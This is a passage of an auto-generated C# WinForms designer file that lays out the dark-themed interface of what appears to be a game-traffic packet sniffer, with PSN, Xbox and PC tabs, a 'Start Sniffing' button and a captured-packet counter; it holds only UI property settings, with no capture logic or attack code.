            this.guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2TextBox3.FocusedState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.FocusedState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2TextBox3.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.HoverState.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.Location = new System.Drawing.Point(405, 4);
            this.guna2TextBox3.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.guna2TextBox3.Name = "guna2TextBox3";
            this.guna2TextBox3.PasswordChar = '\0';
            this.guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.White;
            this.guna2TextBox3.PlaceholderText = "Your PSN";
            this.guna2TextBox3.SelectedText = "";
            this.guna2TextBox3.Size = new System.Drawing.Size(148, 32);
            this.guna2TextBox3.TabIndex = 151;
            this.guna2TextBox3.TextChanged += new System.EventHandler(this.guna2TextBox3_TextChanged);
            // 
            // guna2HtmlToolTip1
            // 
            this.guna2HtmlToolTip1.AllowLinksHandling = true;
            this.guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
            // 
            // guna2Button3
            // 
            this.guna2Button3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Button3.Animated = true;
            this.guna2Button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.BorderColor = System.Drawing.Color.Empty;
            this.guna2Button3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.CheckedState.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2Button3.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.Ani.SetDecoration(this.guna2Button3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Button3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.Transparent;
            this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2Button3.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2Button3.Location = new System.Drawing.Point(881, 4);
            this.guna2Button3.Name = "guna2Button3";
            this.guna2Button3.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button3.Size = new System.Drawing.Size(206, 36);
            this.guna2Button3.TabIndex = 143;
            this.guna2Button3.Text = "Authorize";
            this.guna2HtmlToolTip1.SetToolTip(this.guna2Button3, "Authorize Token");
            this.guna2Button3.Click += new System.EventHandler(this.guna2Button3_Click);
            // 
            // guna2Button5
            // 
            this.guna2Button5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Button5.Animated = true;
            this.guna2Button5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.BorderColor = System.Drawing.Color.Empty;
            this.guna2Button5.BorderThickness = 1;
            this.guna2Button5.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.CheckedState.ForeColor = System.Drawing.Color.White;
            this.guna2Button5.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2Button5.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(86)))), ((int)(((byte)(179)))));
            this.Ani.SetDecoration(this.guna2Button5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Button5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Button5.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(86)))), ((int)(((byte)(179)))));
            this.guna2Button5.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2Button5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2Button5.ForeColor = System.Drawing.Color.White;
            this.guna2Button5.HoverState.ForeColor = System.Drawing.Color.White;
            this.guna2Button5.Location = new System.Drawing.Point(881, 4);
            this.guna2Button5.Name = "guna2Button5";
            this.guna2Button5.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Button5.Size = new System.Drawing.Size(206, 36);
            this.guna2Button5.TabIndex = 145;
            this.guna2Button5.Text = "Authorize";
            this.guna2HtmlToolTip1.SetToolTip(this.guna2Button5, "Authorize Token");
            this.guna2Button5.Click += new System.EventHandler(this.guna2Button5_Click_5);
            // 
            // guna2CircleButton3
            // 
            this.guna2CircleButton3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2CircleButton3.Animated = true;
            this.guna2CircleButton3.BackColor = System.Drawing.Color.Transparent;
            this.guna2CircleButton3.BorderColor = System.Drawing.Color.Empty;
            this.guna2CircleButton3.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2CircleButton3.CustomBorderColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.guna2CircleButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2CircleButton3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2CircleButton3.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2CircleButton3.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton3.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton3.Image = ((System.Drawing.Image)(resources.GetObject("guna2CircleButton3.Image")));
            this.guna2CircleButton3.Location = new System.Drawing.Point(962, 33);
            this.guna2CircleButton3.Name = "guna2CircleButton3";
            this.guna2CircleButton3.PressedColor = System.Drawing.Color.DimGray;
            this.guna2CircleButton3.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.guna2CircleButton3.Size = new System.Drawing.Size(39, 36);
            this.guna2CircleButton3.TabIndex = 166;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2CircleButton3, "Tools");
            this.guna2CircleButton3.Click += new System.EventHandler(this.guna2CircleButton3_Click);
            // 
            // guna2CircleButton2
            // 
            this.guna2CircleButton2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2CircleButton2.Animated = true;
            this.guna2CircleButton2.BackColor = System.Drawing.Color.Transparent;
            this.guna2CircleButton2.BorderColor = System.Drawing.Color.Empty;
            this.guna2CircleButton2.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2CircleButton2.CustomBorderColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.guna2CircleButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2CircleButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2CircleButton2.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2CircleButton2.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton2.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton2.Image = ((System.Drawing.Image)(resources.GetObject("guna2CircleButton2.Image")));
            this.guna2CircleButton2.Location = new System.Drawing.Point(1052, 33);
            this.guna2CircleButton2.Name = "guna2CircleButton2";
            this.guna2CircleButton2.PressedColor = System.Drawing.Color.DimGray;
            this.guna2CircleButton2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.guna2CircleButton2.Size = new System.Drawing.Size(39, 36);
            this.guna2CircleButton2.TabIndex = 144;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2CircleButton2, "Settings");
            this.guna2CircleButton2.Click += new System.EventHandler(this.guna2CircleButton2_Click);
            // 
            // guna2CircleButton1
            // 
            this.guna2CircleButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2CircleButton1.Animated = true;
            this.guna2CircleButton1.BackColor = System.Drawing.Color.Transparent;
            this.guna2CircleButton1.BorderColor = System.Drawing.Color.Empty;
            this.guna2CircleButton1.Cursor = System.Windows.Forms.Cursors.Default;
            this.guna2CircleButton1.CustomBorderColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.guna2CircleButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2CircleButton1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2CircleButton1.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2CircleButton1.ForeColor = System.Drawing.Color.White;
            this.guna2CircleButton1.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2CircleButton1.Image = ((System.Drawing.Image)(resources.GetObject("guna2CircleButton1.Image")));
            this.guna2CircleButton1.Location = new System.Drawing.Point(1007, 32);
            this.guna2CircleButton1.Name = "guna2CircleButton1";
            this.guna2CircleButton1.PressedColor = System.Drawing.Color.DimGray;
            this.guna2CircleButton1.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
            this.guna2CircleButton1.Size = new System.Drawing.Size(39, 36);
            this.guna2CircleButton1.TabIndex = 167;
            this.guna2HtmlToolTip1.SetToolTip(this.guna2CircleButton1, "Refresh Adapters");
            this.guna2CircleButton1.Click += new System.EventHandler(this.guna2CircleButton1_Click);
            // 
            // guna2Transition1
            // 
            this.guna2Transition1.Cursor = null;
            animation4.AnimateOnlyDifferences = true;
            animation4.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.BlindCoeff")));
            animation4.LeafCoeff = 0F;
            animation4.MaxTime = 1F;
            animation4.MinTime = 0F;
            animation4.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicCoeff")));
            animation4.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicShift")));
            animation4.MosaicSize = 0;
            animation4.Padding = new System.Windows.Forms.Padding(0);
            animation4.RotateCoeff = 0F;
            animation4.RotateLimit = 0F;
            animation4.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.ScaleCoeff")));
            animation4.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.SlideCoeff")));
            animation4.TimeCoeff = 0F;
            animation4.TransparencyCoeff = 0F;
            this.guna2Transition1.DefaultAnimation = animation4;
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel1.BorderColor = System.Drawing.Color.Transparent;
            this.guna2Panel1.BorderThickness = 1;
            this.guna2Panel1.Controls.Add(this.guna2CircleButton1);
            this.guna2Panel1.Controls.Add(this.guna2CircleButton3);
            this.guna2Panel1.Controls.Add(this.txtRowCount);
            this.guna2Panel1.Controls.Add(this.panel3);
            this.guna2Panel1.Controls.Add(this.guna2ComboBox1);
            this.guna2Panel1.Controls.Add(this.SniffBTN);
            this.guna2Panel1.Controls.Add(this.guna2CircleButton2);
            this.guna2Panel1.Controls.Add(this.guna2TabControl1);
            this.guna2Panel1.Controls.Add(this.panel2);
            this.Ani.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.guna2Panel1.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(1097, 605);
            this.guna2Panel1.TabIndex = 126;
            this.guna2Panel1.UseTransparentBackground = true;
            this.guna2Panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.guna2Panel1_Paint);
            // 
            // txtRowCount
            // 
            this.txtRowCount.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.txtRowCount.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Transition1.SetDecoration(this.txtRowCount, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.txtRowCount, Guna.UI2.AnimatorNS.DecorationType.None);
            this.txtRowCount.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtRowCount.ForeColor = System.Drawing.Color.White;
            this.txtRowCount.Location = new System.Drawing.Point(961, 578);
            this.txtRowCount.Name = "txtRowCount";
            this.txtRowCount.Size = new System.Drawing.Size(131, 19);
            this.txtRowCount.TabIndex = 164;
            this.txtRowCount.Text = "Captured Packets: 0";
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.panel3.Controls.Add(this.label6);
            this.panel3.Controls.Add(this.guna2TextBox4);
            this.panel3.Controls.Add(this.guna2TextBox3);
            this.Ani.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel3.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel3.Location = new System.Drawing.Point(0, 567);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(1097, 38);
            this.panel3.TabIndex = 165;
            // 
            // guna2ComboBox1
            // 
            this.guna2ComboBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ComboBox1.AutoRoundedCorners = true;
            this.guna2ComboBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2ComboBox1.BorderRadius = 17;
            this.guna2ComboBox1.BorderThickness = 0;
            this.Ani.SetDecoration(this.guna2ComboBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ComboBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ComboBox1.DisabledState.ForeColor = System.Drawing.Color.White;
            this.guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.guna2ComboBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2ComboBox1.FocusedColor = System.Drawing.Color.Empty;
            this.guna2ComboBox1.FocusedState.ForeColor = System.Drawing.Color.White;
            this.guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.guna2ComboBox1.ForeColor = System.Drawing.Color.White;
            this.guna2ComboBox1.ItemHeight = 30;
            this.guna2ComboBox1.Location = new System.Drawing.Point(3, 33);
            this.guna2ComboBox1.Name = "guna2ComboBox1";
            this.guna2ComboBox1.Size = new System.Drawing.Size(808, 36);
            this.guna2ComboBox1.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
            this.guna2ComboBox1.TabIndex = 127;
            // 
            // SniffBTN
            // 
            this.SniffBTN.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.SniffBTN.Animated = true;
            this.SniffBTN.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.SniffBTN.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.SniffBTN.BorderColor = System.Drawing.Color.Empty;
            this.SniffBTN.BorderThickness = 1;
            this.SniffBTN.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.SniffBTN.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.SniffBTN.CheckedState.FillColor = System.Drawing.Color.Black;
            this.SniffBTN.CheckedState.ForeColor = System.Drawing.Color.White;
            this.SniffBTN.Cursor = System.Windows.Forms.Cursors.Default;
            this.SniffBTN.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.Ani.SetDecoration(this.SniffBTN, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.SniffBTN, Guna.UI2.AnimatorNS.DecorationType.None);
            this.SniffBTN.Enabled = false;
            this.SniffBTN.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.SniffBTN.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.SniffBTN.ForeColor = System.Drawing.Color.White;
            this.SniffBTN.HoverState.ForeColor = System.Drawing.Color.White;
            this.SniffBTN.Image = ((System.Drawing.Image)(resources.GetObject("SniffBTN.Image")));
            this.SniffBTN.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.SniffBTN.Location = new System.Drawing.Point(817, 33);
            this.SniffBTN.Name = "SniffBTN";
            this.SniffBTN.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.SniffBTN.Size = new System.Drawing.Size(139, 36);
            this.SniffBTN.TabIndex = 159;
            this.SniffBTN.Text = "Start Sniffing";
            this.SniffBTN.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.SniffBTN.Click += new System.EventHandler(this.guna2Button7_ClickAsync);
            // 
            // guna2TabControl1
            // 
            this.guna2TabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2TabControl1.Controls.Add(this.filteredGamesTab);
            this.guna2TabControl1.Controls.Add(this.playstationTab);
            this.guna2TabControl1.Controls.Add(this.xboxTab);
            this.guna2TabControl1.Controls.Add(this.otherInfoTab);
            this.guna2TabControl1.Controls.Add(this.xblToolTab);
            this.guna2TabControl1.Controls.Add(this.PcTab);
            this.Ani.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2TabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2TabControl1.ItemSize = new System.Drawing.Size(150, 36);
            this.guna2TabControl1.Location = new System.Drawing.Point(0, 77);
            this.guna2TabControl1.Name = "guna2TabControl1";
            this.guna2TabControl1.SelectedIndex = 0;
            this.guna2TabControl1.Size = new System.Drawing.Size(1097, 488);
            this.guna2TabControl1.TabButtonHoverState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonHoverState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonHoverState.InnerColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonIdleState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonIdleState.InnerColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonSelectedState.BorderColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonSelectedState.FillColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10F);
            this.guna2TabControl1.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
            this.guna2TabControl1.TabButtonSelectedState.InnerColor = System.Drawing.Color.Transparent;
            this.guna2TabControl1.TabButtonSize = new System.Drawing.Size(150, 36);
            this.guna2TabControl1.TabIndex = 50;
            this.guna2TabControl1.TabMenuBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2TabControl1.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
            this.guna2TabControl1.SelectedIndexChanged += new System.EventHandler(this.guna2TabControl1_SelectedIndexChanged);
            // 
            // filteredGamesTab
            // 
            this.filteredGamesTab.BackColor = System.Drawing.Color.Black;
            this.filteredGamesTab.Controls.Add(this.guna2VScrollBar1);
            this.filteredGamesTab.Controls.Add(this.dataGridView1);
            this.guna2Transition1.SetDecoration(this.filteredGamesTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.filteredGamesTab, Guna.UI2.AnimatorNS.DecorationType.None);
            this.filteredGamesTab.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            this.filteredGamesTab.ForeColor = System.Drawing.Color.White;
            this.filteredGamesTab.Location = new System.Drawing.Point(4, 40);
            this.filteredGamesTab.Name = "filteredGamesTab";
            this.filteredGamesTab.Padding = new System.Windows.Forms.Padding(3);
            this.filteredGamesTab.Size = new System.Drawing.Size(1089, 444);
            this.filteredGamesTab.TabIndex = 0;
            this.filteredGamesTab.Text = "Filtered Games";
            this.filteredGamesTab.Click += new System.EventHandler(this.tabPage4_Click);
            // 
            // guna2VScrollBar1
            // 
            this.guna2VScrollBar1.BindingContainer = this.dataGridView1;
            this.Ani.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar1.FillColor = System.Drawing.Color.Black;
            this.guna2VScrollBar1.InUpdate = false;
            this.guna2VScrollBar1.LargeChange = 9;
            this.guna2VScrollBar1.Location = new System.Drawing.Point(1068, 3);
            this.guna2VScrollBar1.Minimum = 1;
            this.guna2VScrollBar1.Name = "guna2VScrollBar1";
            this.guna2VScrollBar1.ScrollbarSize = 18;
            this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 438);
            this.guna2VScrollBar1.TabIndex = 165;
            this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.White;
            this.guna2VScrollBar1.ThumbSize = 5F;
            this.guna2VScrollBar1.Value = 1;
            // 
            // dataGridView1
            // 
            this.dataGridView1.AllowUserToResizeColumns = false;
            this.dataGridView1.AllowUserToResizeRows = false;
            dataGridViewCellStyle32.BackColor = System.Drawing.Color.Transparent;
            dataGridViewCellStyle32.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle32.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle32.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle32.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle32.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle32;
            this.dataGridView1.BackgroundColor = System.Drawing.Color.Black;
            dataGridViewCellStyle33.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle33.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle33.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.SelectionBackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle33.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle33.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle33;
            this.dataGridView1.ColumnHeadersHeight = 20;
            this.dataGridView1.ContextMenuStrip = this.logInContextMenu2;
            this.Ani.SetDecoration(this.dataGridView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.dataGridView1, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle34.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle34.BackColor = System.Drawing.Color.Transparent;
            dataGridViewCellStyle34.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold);
            dataGridViewCellStyle34.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle34.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            dataGridViewCellStyle34.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle34.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView1.DefaultCellStyle = dataGridViewCellStyle34;
            this.dataGridView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.dataGridView1.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.dataGridView1.Location = new System.Drawing.Point(3, 3);
            this.dataGridView1.Name = "dataGridView1";
            this.dataGridView1.ReadOnly = true;
            this.dataGridView1.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
